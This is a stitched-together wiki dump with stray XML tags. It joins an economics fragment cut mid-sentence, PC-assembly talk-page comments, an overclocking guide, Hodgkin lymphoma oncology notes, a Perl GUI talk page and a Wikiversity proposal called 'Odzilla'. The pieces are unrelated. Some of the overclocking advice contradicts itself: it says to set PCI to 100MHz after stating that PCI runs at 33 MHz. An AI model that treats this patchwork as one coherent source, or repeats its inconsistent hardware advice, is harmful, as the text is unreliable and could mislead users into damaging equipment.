Essentially, &lt;b&gt;ART &gt; MRT&lt;/b&gt;. This is very rarely done intentionally by a government, as it would be extremely unpopular and would be seen as supporting wealthy, high income individuals over more needy households. However, indirect taxation could be said to partly support this. Very high income earners may spend a lower proportion of their income on goods and services, and so pay &lt;i&gt;proportionally&lt;/i&gt; a fewer taxes as a percentage of their income.

== Availability of Drivers ==

It is a modern myth that Windows has better hardware support than Linux. In fact, Linux is the operating system, or kernel if you want, that has support for the largest number of hardware out there. Therefore the sentence &quot;Microsoft Windows is better in terms of hardware compatibility&quot; should be removed.

== Recommended Software List Linking ==

I noticed that some of the Software in the Recommended Software List was split between Wikipedia links or linking to the software web site. Should we make them all link to Wikipedia, link to an external website, or just leave it alone? --[[User:Aurora98|Aurora98]] ([[User talk:Aurora98|talk]]) 03:48, 12 February 2009 (UTC)

== Mmm? ==

Shouldn't it be &quot;Installing the software&quot; instead of &quot;Assembling the software&quot; on the table of contents? Just an opinion.. [[User:Icez|Icez]]
:Fixed it. However, you could have fixed it yourself.[[User:Reub2000|Reub2000]] 07:41, 3 May 2005 (UTC)

== Recommended Software List ==

If you want to add stuff to the aforementioned list, please ensure that you do the following:

# If there is an equivalent program on the list already, so not add it.  Mention it on the talk page so that others can look at it before it gets added.
# There should be no doubles of programs, unless their job is completely different.  (E.g. MSN Messenger does a different job to AIM).


This is all just to ensure that the list doesn't get crowded with unnecessary programs... --[[User:Noogz|Noogz]] 10:40, 14 May 2005 (UTC)

:How do we keep this NPOV, if we can only choose one program to be bleesed by our guide? I'm thinking that the recomended software for both Linux and Windows should be removed.[[User:Reub2000|Reub2000]]

We can't truly have a NPOV but its useful for someone who is assembling a PC. I'm a little confused as to why there are suggestions of desktop environments, those in my opinion are purely personal preference.[[User:71.116.38.46|71.116.38.46]] 02:07, 20 August 2006 (UTC)

== Mac OSX86 ==

Should we include how to install Mac OSX86 (for those who don't know a hacked version of Mac OS X top work freely on PCs) or should we be afraid of lawyers?

I think it might be a good idea not to encourage any illegal activities.[[User:71.116.38.46|71.116.38.46]] 02:58, 20 August 2006 (UTC)

I personally think that we should only stick to mainstream stuff. Mac OSX86 is both illegal and not as mainstream as, say, Linux or BSD. My opinion, but I think it's best we just keep it how it is, and just expand on the description of the existing operating systems. --[[User:Aurora98|Aurora98]] ([[User talk:Aurora98|talk]]) 02:32, 12 February 2009 (UTC)

==Operating Systems==

There needs to additional explanation as to the function of an operating system.  Assume your readership is fairly new to the subject of computer software in general.

[[User:4.245.113.84|4.245.113.84]] 22:24, 3 June 2006 (UTC)

==OpenSuSE==
Hey, just thinking that perhaps it shouldn't say that opensuse is the best GNU/Linux OS. I'm pretty sure there's some rule against being biast like that. Maybe it should be something like &quot;one of the more well known Linux distros&quot;. Also, I changed it to version 10.2 (from 10.1).
:Yeah, it's called having a POV. The rule on Wikipedia is to make the articles NPOV. I assume that carries over mostly to WikiBooks as well. ---[[User:PurplePieman|PurplePieman]] 04:50, 26 May 2007 (UTC)</text>

      <comment>/* How to choose the best CPU for overclocking */</comment>
      <text xml:space="preserve">{{How To Assemble A Desktop PC/Contents}}

[[w:Overclocking|Overclocking]] is the practice of making a component run at a higher clock speed than the manufacturer's specification. The idea is to increase performance for free or to exceed current performance limits, but this may come at the cost of stability.

Overclocking is like supeing up a car, if you just want to get where you're going, there's no need for it. But it is fun and educational and can get you a machine that provides performance all out of proportion to its cost.

Think of the 3GHz on your new 3GHz Pentium 4 as a speed limit asking to be broken. Some other components in your computer can also be overclocked, including RAM and your video card in many cases. Over clocking is possible because of the way electronic parts, especially VLSI (Very Large Scale Integration) chips are made and sold.  All processors in a given line, the Pentium 4 for example, are made the same way, on a large die that is cut up into individual processors, those processors are then tested and graded as to speed, the best chips will be marked as 3.0 GHz the second best 2.8 etc. As time goes by and production processes and masks improve, even the lower rated chips may be capable of faster speeds, especially if vigorous cooling is implemented. Also many manufacturers will mark chips that test faster at slower speeds if there is higher demand for the lower end component. 

It’s important to note that not every chip will be overclockable; it’s really the luck of the draw. Some companies that sell ‘factory overclocked’ systems engage in a practice called “binning” where they buy a number of processors, test them for overclocking potential and throw the ones that don’t overclock in a bin to be resold at their rated speed. Even with processors that have a reputation for overclocking well, some parts simply will not exceed their rating. 

That said, effective cooling can give a boost to a chip's overclockability. With luck you will be able to get extra performance out of your components for free. With luck and skill you can get performance that is not possible even when using the top of the line components. Sometimes you can buy cheaper parts, and then OC them to the clock speed of the higher end component, though the cost of extra cooling can compromise any money you may be saving on the part, not to mention warranty and part life issues.

&lt;font color=&quot;red&quot;&gt;'''WARNING: OVERCLOCKING MAY VOID THE WARRANTY ON THE PARTS BEING OVERCLOCKED. MAKE SURE YOU KNOW WHAT YOU ARE DOING, AS OVERCLOCKING MAY ALSO CAUSE SYSTEM INSTABILITY, AND MAY ALSO CAUSE DAMAGE TO COMPONENTS AND DATA. REMEMBER THE 3 &quot;C'S&quot; WHEN OVERCLOCKING: CAREFUL, CONSERVATIVE, and CAUTIOUS.'''&lt;/font&gt;

== Things that can't be overclocked ==
Although it is possible to overclock many of the components of a computer (such as the CPU, FSB frequency and video card), it is not possible to overclock all components. For example, it is not possible to overclock a hard disk drive nor an optical drive such as a CD-ROM drive. For such devices other solutions exist, i.a. use a quicker file system and/or faster components in the first place; also in some special cases of hard disks drives, update the driver (which contains optimized code); remap blocks with high latencies to low latency blocks (using a tool such as mhdd), and in event a RAID is present, change the configuration, driver and/or software and/or settings. However such techniques and procedures are beyond the scope of this document.

== Components ==

=== CPU ===

The CPU's clock speed is the FSB (Front Side Bus) clock speed (base, not effective speed) times the CPU's multiplier. On most newer CPUs (notable exceptions: AMD Black editions, AMD Athlon FX series and Intel Extreme Editions), the multiplier is locked, so you will have to adjust the FSB clock speed (However, it might be possible to 'unlock' the chip's multiplier on some older chips. See [[w:CPU locking|CPU Locking]].) The FSB is not adjustable on some motherboards, and almost all OEM systems. The FSB and multiplier, if not locked, are adjustable from within the BIOS. Note that upping the FSB clock speed also increases the clock speed of many other components, including RAM. 

When increasing the FSB clock speed, do so in small increments of a few MHz at a time. After you do this, boot up your computer to make sure it works. If your computer successfully boots, increase the FSB some more. If it won't boot, lower the FSB until your computer properly boots up. Repeat until you have the highest setting with which your computer will boot up. Next, test your OS to make sure it is stable by running a burn application, or any application that uses 100% CPU power. If a crash or reboot results, lower the FSB speed some more until it runs smoothly. On some motherboards you are also able to change the voltage of the CPU and other components in order to help stabilize the system. However, this increases the components' heat output and can harm or shorten the life of your system instead. 

Notes: On AMD K8-based chips (Athlon 64, Opteron, Turion, and Socket 754 and 939 Semprons), there is no FSB- there is an integrated memory controller (IMC) and a HyperTransport bus (HTT). The IMC has a base clock speed like a FSB does and for overclocking, it would be adjusted just like a FSB would. The HTT can also be overclocked like the CPU core can be. Its base clock speed is the exact same as the IMC's and thus by default you will overclock the HTT bus as you overclock the CPU. Note that the HTT bus has a multiplier and it is adjustable. Many motherboards do not function well with the HTT bus frequency much over the stock frequency- that's where the adjustable HTT multiplier comes in. (It should be noted that overclocked systems are most stable when the HTT is at or below 1000Mhz)

Also, some newer desktop processors (AMD K8 series with Cool 'n Quiet, Intel Pentium 4 6xx series, Pentium D 830, 840, stepping C1 Pentium D 9xx series with Enhanced Intel Speed Step) and most mobile processors (exc. Celeron M) can vary their operating frequency while running by lowering the CPU multiplier. This results in multipliers below the highest one being unlocked. This allows for a very high FSB/base clock speed with a lower multiplier to use very fast RAM to its full potential without overclocking the CPU so much that it is not stable.

=== How to choose the best CPU for overclocking ===

Assuming that you have selected a quality motherboard, high-quality RAM , thermal solution and power supply; you may wonder why your processor won't exceed a certain speed limit. Lets assume that you have a memory chip that is capable of taking the maximum frequency the motherboard can throw at it and yet, when you exceed a certain speed limit you realize that your system becomes unstable. 

A PCI bus generally runs at 33 Mhz. When you exceed 35-36 Mhz, the hard disk and other IDE devices become unstable, because the IDE controller is controlled through the PCI bus. Oftentimes, you may encounter texture corruption, when your AGP bus exceeds a certain speed limit. This was often observed on older motherboards that wouldn't allow you to lock the AGP and the PCI bus at stock speeds.
 
The good news: regardless of the FSB speed, most motherboards nowadays automatically ensure that the frequency of the PCI, AGP and other buses always remain constant (in other words; their speeds are locked unless you deliberately change them). This implies that the other components connected to the motherboard don't undergo stress when the FSB speed is raised. You have the fastest RAM you could find and the obscenely fast speed ratings on your ensure that you can extract the most performance by bumping up your FSB  speed to the limits. 

The main culprit that plays the spoilsport is your CPU. Even if you have an exceptionally good thermal solution, your CPU won't exceed a certain limit.

Example: I had experimented with a Pentium III 700E Mhz processor and a Pentium III 800E MHz processor  on an Asus CUBX-E motherboard using Kingston PC-133 SD-RAM. The reason I chose these 2 processors for experimentation was because they both used a FSB speed of 100MHz. This motherboard was really flexible, I was able to increment the FSB to 150Mhz. I was able to extract 1050 MHz from the stock 700Mhz. This is because the multiplier is 7, which unfortunately cannot be changed. So I bumped up the FSB from 100Mhz to 150 Mhz; which gave me the resultant speed of:

{| align=&quot;center&quot; style=&quot;text-align: center&quot; cellpadding=&quot;10px&quot; 
| 7&lt;br&gt;(Multiplier) || &amp;times; || 150&lt;br&gt;(Front Side Bus) || = || 1050 MHz&lt;br&gt;(resultant frequency)
|}
                                               
Simple arithmetic? Yes. Now, logically speaking, if I can extract 1050Mhz from a 700Mhz processor; I should be able to extract 1200Mhz from an 800 MHz processor. This is not true. I tried doing exactly the same with the 800 MHz processor and the Computer crashed. However, it was stable when I set the FSB speed to 133 MHz. When I set the FSB at 133 MHz ; this was the result:

{| align=&quot;center&quot; style=&quot;text-align: center&quot; cellpadding=&quot;10px&quot; 
| 8&lt;br&gt;(Multiplier) || &amp;times; || 133&lt;br&gt;(Front Side Bus) || = || 1064 MHz&lt;br&gt;(resultant frequency)
|}

This simple experiment shows that a CPU gets saturated after a certain clock speed. Typical symptoms of an erratic CPU include instability and at times, you may not be able to boot up at all.

This particular CPU die was manufactured using a 0.18u process. When Intel launched a similar CPU using a 0.13u process; they shipped those CPUs with the stock speed of up to 1.4Ghz. This CPU core was based on the P6 Architecture and it used a 10 stage pipeline. Presently, Intel manufactures the Pentium-M CPU which is based on the P-6 architecture; the difference being that they manufacture it using a 0.09u process and they have increased the depth of the pipeline. 

These terms may seem cryptic and this concept may be difficult for some to grasp. It's really very simple: To be a successful overclocker; you need to purchase the best CPU possible; not necessarily the fastest. Always go for a processor that uses the latest manufacturing process. A CPU rated at 3Ghz which is manufactured by using a 0.13u process won't overclock as well as a CPU that is rated at 2.6Ghz using a 0.09u process.

Deeper pipelines ensure that the CPU has the capability to scale higher in terms of speed. The disadvantage is that a CPU with a deeper pipeline is slower than a CPU that uses a smaller pipeline assuming that they are running at the same speed. AMD Athlon CPUs are famous for their relatively short pipelines. Thats why they perform better than the Pentium 4 CPUs at the same clock speed. Before purchasing the fastest processor, always keep this in mind. Choosing a processor smartly helps you extract the maximum speed out of your machine. You don't need to know what a pipeline exactly does. Refer to the processor spec sheet, find out these basic details of the CPU core and its architecture and choose accordingly.

To increase the computer's stability, you may also disable the spread spectrum; set the PCI speed to 100MHz; set the voltage to the middle range, not too high; and disable any smart fan settings. and those settings work for all recommended boards.

=== Video card ===
Two different parts of a video card may be overclocked&lt;ref&gt;{{cite web| last = Coles | first = Olin | title = Overclocking the NVIDIA GeForce Video Card | url=http://benchmarkreviews.com/index.php?option=com_content&amp;task=view&amp;id=205&amp;Itemid=38 | accessdate = 2008-09-05 }}&lt;/ref&gt;, the GPU (Graphics Processing Unit) and the RAM. In addition, disabled pipelines on a video card may also be enabled through third-party drivers, third-party software, or direct hardware modifications depending on your video card type. Overclocking a video card is usually done through third-party or proprietary software. 

Recent ATI proprietary Catalyst drivers feature an interface called Overdrive that allows for dynamic GPU frequency scaling based on its temperature and load. Increase the load, the clock rate increases for performance, but it's balanced against the increasing temperature. Sufficient for simple increases in overall performance, this doesn't allow for the best performance increase which requires overclocking the memory. For that you'll need third-party applications or drivers. 

An application example is ATITool. This program has many options, including GPU and memory overclocking, temperature monitoring, and fan control, allowing for a much more complete solution to overclocking ATI based video cards. There are many third party drivers, omegadrivers.net, for example hosts ATI and nVidia drivers as well. Both of which include integrated overclocking and many unlocked features, including enhanced image quality for nVidia-based cards. 

nVidia video cards can also be OCed through a hidden feature in the driver called coolbits. Coolbits is a feature that can be unlocked by creating a DWORD in regedit for windows operating system. To use the coolbits feature, for windows just simply open the regedit then open the directory HKEY_LOCAL_MACHINE&gt;Software&gt;NVIDIA Corporation&gt;NVTweak and create a new DWORD value in the NVTweak folder named coolbits then right-click it&gt;modify type 3 for single card or 1A for SLI in the value name .It is a good a overclocking tool as it has a fairly conservative &quot;optimal clock&quot; once you have thus increased the core clock (not the memory clock!!)  run a gpu intensive task like 3dmark, repeat until you have a sudden drop in the benchmark score. This is the thermal throttling kicking in; do not push it any harder as it will result in permanent damage to your gpu. Back off the clockspeed by about 20-30mhz

The most important thing to remember about overclocking a video card is cooling. This can't be stressed enough. Just as a CPU can be damaged or have a shortened lifespan by overclocking or excessive and prolonged heat, so can a video card. In the past year many inexpensive and easy to install options have surfaced for cooling a video card, from adhesive ram heatsinks which attach to un-cooled ram chips, to rather expensive water-cooling solutions. A good midpoint (both in cost and effectiveness) solution is to purchase and install a direct exhaust, &quot;sandwich&quot; cooling solution. Direct exhaust means all air from the cooling fan is blown across the video card and directly out of the computer case, usually using the open PCI slot below the AGP (or PCIe) slot. This allows for substantially lower GPU temperatures.

A sandwich cooler is two aluminum or copper heatsinks, shape formed for a particular video card, that &quot;sandwiches&quot; the video card in between the two and are usually connected by some kind of copper heat pipe which allows for the hotter side to convey heat to the cooler side for dissipation. The GPU should never surpass 60 degrees Celsius for optimal performance and to avoid damaging the card. Most of the latest video cards are rated to go up to 90c, but this is NOT recommended by anyone. The optimal temperature for a video card is 40-55c for the card itself (the GPU's temperature differs depending on which you have,) but the lower you can get it, the better.

It is also possible to use software to change the fan speed on certain cards. Changing the fan to run at full speed can cool the card better, dependening on your card and the speed of the fan in the first place. Software such as [[Rivatuner]] can be used for Nvidia based cards.

One important thing to note.  Many think that the option which says &quot;AGP voltage&quot; in their BIOS can be used to &quot;voltmod&quot; a video card to get a bit more power out of it.  In fact, it's used for something else, and raising the AGP voltage can and probably will cause damage to a video card.

== Getting the few extra MHz out of a chip ==

=== Cooling ===

When increasing the speed of any computer components you are making the components work harder and by doing so they output more heat. Heat can cause system instability so cooling is necessary to help keep your components stable at higher speeds. Without good cooling you could harm or shorten the life of your system. CPU temperature can usually be checked from within the BIOS. However, these are inaccurate as your CPU is under almost no load in the bios. SiSoftware Sandra may be used within Windows to check temperature. This should be done when your CPU has been under a heavy load for a while for optimum results.

There are three types of cooling that are generally accepted for overclocking: Air, water, and peltier.

With both air cooling and water cooling some type of transfer material is needed to move the energy away from the sensitive electronics. The device used for this purpose is a heatsink. The two most popular heatsink materials are Aluminum and Copper. The heatsink that is stock on factory computers by major manufacturers (Dell, Gateway, IBM) is usually made of aluminum, which has satisfactory heat transfer characteristics. However when overclocking more heat is being produced from the increase in power consumption. In order to obtain lower temperatures a material with better heat transfer properties is important and copper is the material that offers the best ratio of price/performance.

=== Power ===

Chips at higher speeds may need more power. Raising the vcore voltage on a CPU might enable it to go at slightly faster speeds but by doing so you add a lot more heat output from the CPU. The vcore of a processor is the voltage at which a chip is set to run at with the stock speed. This voltage may need to be changed when the multiplier is raised because otherwise the transistors in the chip won't switch fast enough - transistors switch faster the higher the supply voltage. If there is not enough voltage then the chip will begin to make mistakes and give bad data results. Good cooling is needed to keep the system stable at higher speeds. Raising the vcore too much may harm or shorten the life of your system. Raising the vcore can also greatly affect the stability of the system. This is where a high quality PSU will come into play. While many cheap, no-name brand PSU's will crash and die with more vcore, a good quality one will live to serve you for a long time.

Note: increasing the speed (multiplier or fsb) without changing the voltage will also increase heat output, but not as much as when also increasing voltage. Having said that, increasing the multiplier or FSB without adjusting the voltage may make your system unstable (undervolt).

==Epidemiology==
*About 14% of lymphomas; 1% of all cancers.  
*Adult HD has bimodal age distribution: peaks at age 20-29 and again in the 50+ range
*[[Radiation_Oncology/Pediatric_Hodgkin%27s|Pediatric HD]] typically occurs 4-14 years old; marked male predominance 4:1
*90% have disease in contiguous nodes (assuming para-aortics are contiguous to SCV via thoracic duct)
*Visceral involvement may be local extension or hematogenous; rare to GI lymphatics (Waldayer's ring or Peyer's patch)

==Work-Up==
*History: look for B symptoms. Also fatigue, alcohol-induced pain, pruritus.
*PE: Palpable nodes, palpable viscera
*Labs: CBC, blood chemistry, albumin, ESR
*Radiology: CXR, CT, PET
*Biopsy: LN excision; bone marrow Bx if B-symptoms, subdiaphragmatic disease or Stage III-IV disease
*Staging laparotomy no longer used

==Classification==
*Rye classification (1966)
**By Lukes and Butler. Presented at a conference in Rye, New York.
**Found that different subtypes have different prognoses:
***Lymphocyte predominant (most favorable)
***Nodular sclerosis (favorable)
***Mixed cellularity (guarded)
***Lymphocyte depleted (least favorable)
*World Health Organization (WHO) classification
**'''Classic Hodgkin lymphoma:'''  CD 15+, CD 30+
**'''Nodular lymphocyte predominant'''  CD 15-, CD 30-, CD 20+

==Pathology==
*Classic HL
**Presence of classic Hodgkin/Reed-Sternberg (HRS) cells
***Do not exhibit phenotypes typical of any normal cell
***CD15+; marker is expressed on granulocytes
***Somatic hypermutation of immunoglobulin genes, with VDJ rearrangement. This is typically seen only in germinal B cells and post-germinal B cells
***Study of patients with both HL and NHL shows they are clonally related, suggesting that initial transformation occurred in a germinal B cell. Subsequently, there are two distinct sets of molecular lesions, which lead to divergent phenotypes of HL and NHL
***HRS cells appear to lose their germinal B cell characteristics, and become unable to transcribe RNA for immunoglobulin due to impaired activation of Ig promoters
***There is also activation of NF-kB pathway, which leads to c-REL increase and promotion of lymphocyte transformation and prevention of apoptotic deletion
***There is a widespread genomic instability, which contributes to the strange nuclear appearance
*Nodular lymphocyte predominant HL
**Prevalent tumor cell is &quot;lymphocytic and histiocytic&quot; (L&amp;H) subtype of HRS cells
***Pathologically looks like popped corn
***Express B-cell markers
***Have multiple features that resemble normal germinal B-cells
**Classic HRS rare or absent; appears with multiple nuclear lobes and large nucleoli

      <text xml:space="preserve">is this really GUI programming?
or is this something to show others what you have programmed?


It is not a GUI at all, it is a CLI, and a very feeble game.

What relevance does this have to perl GUIs?
Take a look at Section 6 - this is just a cut 'n' paste!

I think this should be a candidate for deletion - Repeats from Chap. 6, has no relevance to the topic. Any objections?
My bad - this should probably just be listed on modules needing heavy editing...

I'm going to edit this myself, make it a stub...
There. Slightly better - I intend to come back after I've learned a little more about the subject.

DakeDesu:

Well, it appears you have nice links to the CPAN pages... however, may I suggest a mirror of the associate perldoc entries for these?

Also, it appears I've found this page before whatever it is a redunancy of. Maybe post a link to the other page?

      <text xml:space="preserve">Hi,

my name is Michael. I'm interested in Wikiversity because I have the similar idea for a long time: a central repository on the Web where one can learn whatever subject s/he chooses. The nowday online courses are nothing but a one big mess and what I want is:
* today I decided to learn Japanese: I go to Wikiversity and I'm sure I'll find a well structured and professional Japanese course there;
* tomorrow I'll decide to learn Java programming language: I go to Wikiversity and I'm sure I'll find this course '''structured in the same''' familiar way;
* in a year I'll want to learn Calculus... you've got the idea.

Here is the presentation of my idea about the structured information storage using Wiki technology - code named [[User:Catpad/Odzilla|Odzilla]].

      <text xml:space="preserve">'''Odzilla''' - is a name of the '''collaboratively created structured information storage'''.

'''Please note:''' the following description of the Odzilla project is not immediately applicable to  Wikiversity because it was developed as an independent project.
Then, as I found the Wikiversity project, I decided that my information structure ideas can be useful (in some way) to this project.



==The building blocks of Odzilla==

The main feature of Odzilla content-management system is that it is '''component-based'''. This term is borrowed from the software and defines a system that can be constructed from  independent blocks – pieces of software with autonomous behaviour. Equally, we define the most important concept of Odzilla – '''Piece of Knowledge (POK)''' as an independent piece of information (of whatever nature) that can be used as a building block to create larger POKs.

There are two main features of POK:
* It can be nested.
* It is evolving with time and keeps track of all the changes made to it.
(more about the features of POK in a moment)

&lt;pre&gt;
POK can be text, picture, footnote, diagram, dictionary entry, exam question etc. 
as well as it can be a lesson or a whole course.
&lt;/pre&gt;

'''Why HTML documents are bad ?'''

Documents are scattered throughout the Web, they are constantly changing, moving and get lost. They are unreliable, unsorted, uncategorized and do not belong to anybody. The documents cannot keep the history of their own changes, they cannot be commented and, once translated, they cannot keep the various translations together. 
Thus, the notion of the Document – the central concept of the Information Age – is bad.

'''Why Information Components – Pieces of Knowledge (POK) are good ?'''

''Piece of Knowledge'' is a multilayered, multidimensional, self-contained document.
POK keeps its own history with it forever. It keeps all the translations that have been made to it, all the remarks, notes and comments made by its readers. It contains the copyright information and the categorization information within global classification directory. However, since the Web is a decentralized place and no central control and the unified directory is possible (and ever will be possible), the classification of the POK is just a system of facets and titles within facets that give hints of where in the global possible directory the POK can be found. These hints (facets and titles) are constantly connecting to form the semantic maps – the network of the categories – that can help to find for every POK its unique place within the Directory. This network itself is the Directory.

'''Here are the basic features of a POK:'''

* A POK grows both in space and in time and keeps track of its history forever (just like a Wiki page).
* A POK is multilayered; each layer represents an adjustment of its contents to another audience (I call it ''flavors''; it will be explained later).
* A POK is a nested structure: it can consist of other POKs and, in turn, can be a part of some other, larger, POK.
* A textual POK is representation-independent. It is marked up to give the rendering system the commands (or hints) of how to represent the text.


Now, more about POKs.

POK can be anything from the following list and more:

1. Program (consisting of courses)

2. Course (consisting of lessons and exams)

3. Lesson (consisting of everything that follows)

4. Text (paragraph, chapter, etc.)

5. Article

6. Picture

7. Diagram, chart

8. Side note, side bar

9. Footnote

10. Example (code example, text example, etc.)

11. Quotation

12. Table

13. Dictionary entry

14. Reference

15. Timeline

16. Multimedia (sound clip, video clip)

17. Interactivity (Java applet, Flash, etc.)

18. Exam or test question

19. Template


''Template'' is a special category. It is a POK that can be used to create other POKs. Thus, for example, there can be a ''Course Template'' with lessons, tests and exams but without real content in any of them. 

The following figure shows the buidling blocks of a POK.


[[Image:POKStructure.gif|The structure of the POK]]


There are several things here:

1. '''History''': this is the different versions of the POK that allow to compare and see the changes made to it. This is what keeps POK from getting messed up or accidentally deleted.

2. '''Categorization''': the line to Categorization is bold since it is the must-have for any POK. Categorization determines the coordinates of the POK in the semantic field. The categorization system is yet to be developed, but apparently it should be the '''faceted classification''' mentioned above: for exmaple, facet ''type'' or ''category'' with the title (or header) ''mathematics'', facet ''subtype'' with the title ''calculus'', facet ''complexity'' with the title ''higher mathematics'', facet ''time frame'' with the title ''XVIII century'', etc.

3. '''Translations''': if a POK is a textual one, it can exist in several languages, so a student can easily switch between either language.

4. '''Discussion''': every POK can become a subject for a discussion. Any student or teacher can start a discussion by saying, for example: “I think this is wrong. I have different information”. Anybody else can reply to this comment, say, by presenting a proof against it. The discussion can be short or long but, anyway, it becomes a part of this POK’s lifecycle.

5. '''Annotations''': this is close to discussion but slightly different. Usually, discussion has to say something about the whole topic and expects an answer. On the contrary, annotation can refer to a single word or phrase and exist as a note or memo made by somebody who doesn’t really expect any answer on it.

6. '''Flavors''': they can be useful together with POKs that are templates. For example, I can prepare a POK – template for the generic programming language course, say, OOP language. Then this POK can be changed to teach the concrete language: C++ flavor (using appropriate examples), Java flavor, Smalltalk flavor, etc. The same mechanism can be probably used for the similar natural language courses (e.g. Slavic languages or Roman languages). Another useful feature of flavors is to vary the same POK for different audiences. We will see this usage later.

7. '''References''': there references to and from the POK. References to are other POKs that use or point the current POK (e.g. a lesson that use this test question (current POK) as a component). References from can include hyperlinks to external sites, books in online shops, dictionary entries, other POKs, etc.

8. '''Presentations''': they are not exactly the part of a POK (that’s why the dashed line is used). The text POK can exist in many different visual forms (e.g., using various CSSs). These CSSs can be stored as a part of the POK.

Obviously, not every POK can have all mentioned components. Picture POK, for example, cannot have translations, flavors and presentations but can have discussion, annotations, history and references.


==Knowledge Pool==

'''Knowledge Pool''' is the main repository of POKs (Pieces of Knowledge) where creators of courses (Teachers) can draw their components from. Anyone can create a POK (using the Wiki technology) whether it is a small text that can be used as a part of a lesson or an article, exam question, picture, dictionary entry or a lesson. The POK is strongly categorized (using faceted classification), placed in the Knowledge Pool and begins its own life. POK creators (and other users) can always review their POKs, rewrite and recreate them. 
Knowledge Pool should be searchable using categorization of POKs.

==Examples==

To see how POKs are hierarchically organized within Odzilla let's look at an example.

&lt;pre&gt;
COURSE: America in Depression and War

	LESSON 1: Introduction: From Breadlines to Atom Bombs
COURSE PART 1: The Great Depression
	LESSON 2: The End of Prosperity
	LESSON 3: The Unemployed
COURSE PART 2: New Deal
	LESSON 4: Roosevelt’s 100 Days
	LESSON 5: Strikes and Struggles
	LESSON 6: New Deal Order
	LESSON 7: Paper One Due
COURSE PART 3: World War II at Home
	LESSON 8: From Isolationism to Pearl Harbor
	LESSON 9: Mobilizing for Victory
	LESSON 10: Gender and Race in Wartime
COURSE PART 4: World War II Abroad
	LESSON 11: D-Day
	LESSON 12: Paper Two Due
	LESSON 13: Hiroshima
	LESSON 14: Conclusion: Legacies for Postwar America
Final EXAM
&lt;/pre&gt;

Here the categories of POKs are all in capital letters (LESSON, COURSE, COURSE PART, EXAM). To have a better idea about the hierarchy, look at the following figure:


[[Image:LessonIntoPOKs.gif|The Lesson broken down into POKs]]


The more the number of POKs in the '''Odzilla Knowledge Pool''' (i.e. in the set of all POKs) and the finer they are tuned, the easier it is for other users to find them and to use them in their own courses or texts. For example, the image POK on the next figure can be used in various courses related to the history of America, the general history, photography courses, etc.

[[Image:ImagePOK.gif|The Image POK]]

==Constructing a larger POK (a course) from smaller POKs==

Having a searchable Knowledge Pool at hand one can easily construct a course by using the existing material  - POKs - and writing new ones. Let's take as an example a schematic lesson on programming language LISP as in the figure:


[[Image:LISPCourse.gif|The schematic course on LISP programming language]]


This lesson can be constructed from several building blocks (POKs):
* TEXT POK with the introductory text;
* TEXT POK with the history text;
* CODE EXAMPLE POK with an example of the function written in Lisp;
* FOOTNOTE POK with an external link in it;
* SIDENOTE POK with the short biography;  
This breakdown is shown in the following figure. Note that the lesson itself is also a POK of type LESSON.


[[Image:LISPCourseIntoPOKs.gif|The Image POK]]


Now, it's clear that these POKs can also be used in other courses and lessons. For instance, the CODE EXAMPLE POK can be used in a course about functional programming, or in a lesson about recursion in various programming languages, or in a general computer science course for beginners.

 
Let's take the first TEXT POK of this example to understand the nature of '''flavors'''.
In the next figure there are two variants (''flavors'') of the same text. The first one is an introductory text for the very beginners, the second one is an equally introductory text but for the more advanced auditory. Thus, in the second case, the Lisp is called a family of languages (i.e. dialects) of the original version – the fact that can be of no interest for the novice students. It uses such terms as abstract notation for recursive functions – the words that should not be used for the courses where the notion of recursive function is not studied yet.
Note, that these two flavors are still '''the same POK'''. The flavor feature allows the fine tuning of the existing POK for different kinds of audience.

[[Image:POKFlavors.gif|The Image POK]]


Besides, it can be very useful and even entertaining to be able to see various flavors of the same POK while learning your subject of interest.


==Roles and responsibilities==

The following roles can be distributed between the participants of the Odzilla project:

* '''Teachers''': the people who create courses and lessons. They are not necessarily following the breakdown rules, that is they can leave their texts as they are, without dividing them into POKs. The Teachers are the experts in their subjects.
* '''POK creators''': these people are the experts who don’t want to prepare complete courses or even lessons, but just want to contribute to the Knowledge Pool by adding useful pieces of information. Another type of POK creators are the experts who add various flavors for the existing POKs in such a way that these POKs will become useful in other courses.
* '''POK managers''': these people are not necessarily experts in the various subjects. They are looking for POKs that can be divided into smaller pieces and can be used in other courses in this smaller form. They are responsible for categorization of these newely created POKs. 
* '''Template makers''': the people who make generic templates (skeletons) of courses, programs and lessons without going into the material. They can also prepare the templates for the specific subject without filling in the materials (course outlines like in an example in Figure 3). These people should understand the methodology and the patterns of education; in the second case they should be the experts as well.
* '''Presentation designers''': they are working on various (pleasant, convenient, user friendly) presentations of the material: layouts of the lessons, colors, fonts, text alignments, etc.
* '''Editors''': These are the super-experts in various fields who can monitor the POKs being created, edit the information in them or delete useless POKs at all.
* '''Translators''': translate text POKs into different languages.
* '''Students''': they are playing an equally important role in Odzilla as Teachers are. Students create the second part of Odzilla – commentaries, notes, personal diaries, annotations, homeworks; they participate in discussions and communicate with one another and with their teachers.

==The (possible) process of creating the Wikiversity==

So, how one can start to create such a mega-structure as Wikiversity without just putting together lots of old-fashioned scanned dull textbooks ?
The answer is: by creating the larger, more complex structures such as courses, lessons and exercises from smaller parts: concepts, sidebars, footnotes, images, examples, etc. - the POKs.
The creation of a concept is relatively simple - it's just like creating an article in Wikipedia. This is an exellent example (http://en.wikibooks.org/wiki/Wikiversity:Forms:Circle) of a basic concept (&quot;Circle&quot;) made of many various ''flavors''. Imagine, that we have tons of concepts defined like this in such a way that we can turn off and on some of their flavors. We can combine them into lessons putting an appropriate stress on those flavors that serve our purposes best. For example, having a mathematical lesson for young children we can leave such characteristics of &quot;Circle&quot; as ''Mathematical definition'' and ''Similar Forms''. Writing an article about the history of mathematics we can use ''History'' and ''Qualitative description'', for example. Then, we turn on the same flavors for all the concepts we use in the lesson and now that's easy - we can construct many interdisciplinary texts from the same basic set of concepts.
These lessons can in turn be combined into courses, books, etc.

So, the Wikiversity can use the bottom-up approach: create the basic concepts bearing many flavors (characteristics) and combine them into larger structures using those flavors that are mostly appropriate for the current purpose.

==The conclusion==

The difference between the semantic net (web) and Odzilla is that Odzilla is supposed to be '''self-organized organism''' – a living swamp, where individual genes (POKs) evolve, interconnet and gather into hierarchical structures.
We are witnessing that the Wikipedia project is working. It is self-organizing, self-adjusting and growing very fast. That proves the idea.

Odzilla adds to the idea of Wikipedia three new elements: 
* component-based organization of knowledge with evolving components (which should lead to the creation of the semantic net);
* hierarchical organization of information (which allows to make it the University and not just the Encyclopedia);
* extensive review, commentary, discussion and annotation possibilities by the recipients of information (students) who can share their thoughts and opinions, so, that their teachers can refine the information and their fellow students can rely on the experience of their predecessors. 

